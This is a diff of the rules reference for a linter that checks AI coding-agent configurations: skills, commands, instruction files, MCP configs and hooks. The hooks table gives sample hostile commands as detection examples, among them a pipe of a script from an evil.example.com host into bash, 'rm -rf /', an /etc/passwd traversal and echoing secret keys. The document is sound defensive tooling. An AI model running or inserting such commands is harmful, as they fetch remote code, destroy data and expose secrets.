@@ -8,7 +8,11 @@ Each rule is a Python class that inspects one component and reports findings. Ru
 
 Severity levels: **error** (broken config, security risk), **warning** (reduces effectiveness), **info** (minor improvement).
 
-All deterministic rules run in the **CLI** (`harness-lint`/`harness-security`), **Plugin** (Claude Code / Cursor), and **GitHub Action**. YARA and CVE rules only run in the `security` preset.
+All deterministic rules run in the **CLI** (`harness-lint`/`harness-gate`/`harness-security`), **Plugin** (Claude Code / Cursor), and **GitHub Action**. YARA and CVE rules only run in the `security` preset.
+
+### Custom YAML rules
+
+Project-local YAML under `.harness-eval/rules/` is **opt-in**. Pass `--rules-from-target` to `harness-lint`. `harness-gate` and `harness-security` never load them. See the [README](../README.md#custom-yaml-rules) for the file format.
 
 Abbreviations: CC = Claude Code, CU = Cursor, CP = Copilot, GE = Gemini CLI, OC = OpenCode, CX = Codex CLI
 
@@ -173,7 +177,7 @@ These rules run against every discovered skill. Applies to: CC, CU, CP.
 | `frontmatter/description-quality` | frontmatter | The description should clearly explain when to use the skill. Vague descriptions cause the AI to load the wrong skill or miss it entirely. | `"Helps with code"` triggers on everything; `"Use when formatting Python with black, line-length 100"` is specific | Heuristic string analysis |
 | `frontmatter/format-valid` | frontmatter | Frontmatter must be valid YAML with correct types. Malformed YAML means the skill metadata can't be parsed. | `description: true` instead of a string, or invalid YAML syntax | YAML parsing + type checks |
 | `content/duplicate-detection` | content | Finds skills that are near-copies of each other. Duplicates waste context window space and can cause conflicting behavior. | Two skills both explaining "how to write tests" with 85% text overlap | TF-IDF cosine similarity |
-| `content/broken-references` | content | File paths mentioned in the skill body must actually exist on disk. Broken references cause runtime failures when the AI tries to read them. | Skill says `See scripts/deploy.sh` but that file was deleted | Path resolution + existence check |
+| `content/broken-references` | content | File paths mentioned in the skill body must actually exist on disk. Advisory (not a gate): extracting path-shaped strings from prose is not a filesystem fact. Backtick paths after `e.g.` / `for example` are ignored; a real path before those markers is still checked. | Skill says `See scripts/deploy.sh` but that file was deleted | Path resolution + existence check |
 | `content/circular-references` | content | Catches reference loops between skills. Circular references waste context and can confuse the AI into loading an infinite chain. | Skill A says "see skill B", skill B says "see skill A" | Graph cycle detection |
 | `content/token-budget` | content | Skills should stay under ~3000 tokens and 500 lines. Oversized skills eat up the context window, leaving less room for the actual conversation. | A 6000-token skill with a lot of boilerplate that could be trimmed or split | Token counting (tiktoken) |
 | `content/orphan-skills` | content | Skills that nothing references (no command, no CLAUDE.md, no agent) may be dead weight. They could be loaded unnecessarily or never loaded at all. | A skill exists but is never mentioned anywhere in the project | Reference graph search |
@@ -237,9 +241,9 @@ These rules run against every discovered command definition. Applies to: CC, CU,
 
 | Rule | Type | What it does | Example | Built with |
 |------|------|-------------|---------|------------|
-| `command/description-required` | structural | Commands must have a `description` in frontmatter. This is what appears in the slash-command menu, so without it users can't tell what the command does. | Command `.md` file has no `description:` in frontmatter | YAML field check |
+| `command/description-required` | structural | Commands must have a `description` in frontmatter. Cursor prose commands with no YAML are skipped. | Command `.md` file has YAML frontmatter but no `description:` | YAML field check |
 | `command/description-quality` | frontmatter | Command descriptions should say what the command does in more than two words. A two-word label is too vague for the UI menu. | Description is `Run tests` instead of `Run the repository test suite` | Word-count heuristic |
-| `command/script-exists` | structural | Script files referenced in the command body must exist on disk. A broken script reference means the command fails every time. | Command says `Run ./scripts/deploy.sh` but the file was deleted | File existence check |
+| `command/script-exists` | structural | Script files referenced in the command body must exist on disk. Repo-root fallback applies only to paths that contain a `/`. | Command says `Run ./scripts/deploy.sh` but the file was deleted | File existence check |
 | `command/duplicate-detection` | content | Finds commands that are near-copies of each other. Duplicate commands confuse users and waste maintenance effort. | `/format-code` and `/lint-code` have 90% identical content | TF-IDF cosine similarity |
 | `command/skill-overlap` | content | Detects commands that duplicate content already in a skill. If a skill covers the same thing, the command is redundant. | Command `/review` has the same instructions as the `code-review` skill | TF-IDF similarity |
 | `command/shadows-builtin` | content | Command names should not collide with built-in slash commands. A custom `/help` command would shadow the built-in one. Only applies to Claude Code. | Naming a command `help`, `clear`, or `config` | Built-in name lookup |
@@ -262,7 +266,7 @@ These rules run against the project's root system instruction file. Applies to: 
 | `claude-md/generic-advice` | quality | System instructions should not contain advice the AI already follows by default. Generic advice wastes tokens without changing behavior. | `"Write clean, readable code"`, `"Use descriptive variable names"`, `"Handle errors properly"` | Pattern matching |
 | `content/missing-boundary-policy` | content | Flags instruction files that define no directory or resource boundaries. Without scope limits, the agent operates with no declared constraints on which files or systems it can access. | CLAUDE.md with coding style rules but no "off-limits" or "do not access" directives | Pattern matching |
 
-## MCP configuration (.mcp.json, .cursor/mcp.json)
+## MCP configuration (.mcp.json, .cursor/mcp.json, .vscode/mcp.json)
 
 These rules run against MCP server configuration files. Applies to: CC, CU.
 
@@ -283,7 +287,7 @@ These rules run against hook definitions. Applies to: CC, CU.
 |------|------|-------------|---------|------------|
 | `hooks/valid-structure` | structural | Hook entries must define a command. An entry with no command is ignored by the runtime. | A `PreToolUse` hook has a `matcher` but no `command` | JSON field check |
 | `hooks/script-boundary` | security | Hook scripts must stay within the project directory. Path traversal in hooks could read or execute files outside the project. | Hook command contains `../../etc/passwd` or `/usr/bin/malicious` | Path traversal detection |
-| `hooks/dangerous-command` | security | Flags hooks that run destructive or dangerous shell commands. Hooks run automatically on every event, so a dangerous command fires repeatedly. | `rm -rf /`, `chmod 777 .`, `curl http://evil.example.com/script \| bash` in a hook | Pattern matching |
+| `hooks/dangerous-command` | security | Flags hooks that run destructive or dangerous shell commands, including any `rm -rf` (not only `rm -rf /`). Hooks run automatically on every event, so a dangerous command fires repeatedly. | `rm -rf ./build`, `chmod 777 .`, `curl http://evil.example.com/script \| bash` in a hook | Pattern matching |
 | `hooks/env-leakage` | security | Flags hooks that might leak environment variables to stdout or external processes. Hook output is visible and could expose secrets. | `echo $SECRET_KEY` or `env \| grep API` in a hook command | Pattern matching |
 | `hooks/network-access` | security | Flags hooks that make network calls. Hooks should be fast and local since they run on every matching event. Network calls add latency and external dependencies. | `curl`, `wget`, or `fetch` in a hook command | Pattern matching |
 | `hooks/matcher-matches-no-tool` | quality | Flags hook matchers that don't match any known tool name. The hook will never fire because no tool has that name. | `matcher: "BasH"` (typo) or `matcher: "MyCustomTool"` (nonexistent) | Built-in tool name lookup |
